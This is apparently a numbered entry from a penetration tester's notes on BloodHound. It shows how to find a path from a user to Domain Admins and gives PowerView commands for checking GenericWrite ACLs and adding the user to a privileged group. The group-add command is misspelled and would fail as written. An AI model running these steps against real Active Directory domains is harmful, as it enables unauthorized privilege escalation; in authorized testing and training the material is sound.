#### 72 BloodHound Basics

In top left, click the "pathway" button, fill out the boxes and hit the go triangle button:

Start Node: $USER
Target Node: Domain Admins

This will show you a path from your user to Domain Admins access.

Right click line and look for help?

In this example, our user is a member of a group called "Hidden", which is a member of Domain Admins.  So $GROUPNAME == Hidden.

We can verify this in PS with PowerView.ps1:

```
Import-Module .\PowerView.ps1
```

```
Get-ObjectAcl -SamAccountName $GROUPNAME | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') }
```

```
Add-DomainGroupMemeber -identify '$GROUPNAME' -Members '$USER' -Domain '$NETBIOS_DOMAIN_NAME'
```

Verify the $USER is now part of $GROUPNAME
```
net user $USER /domain
```
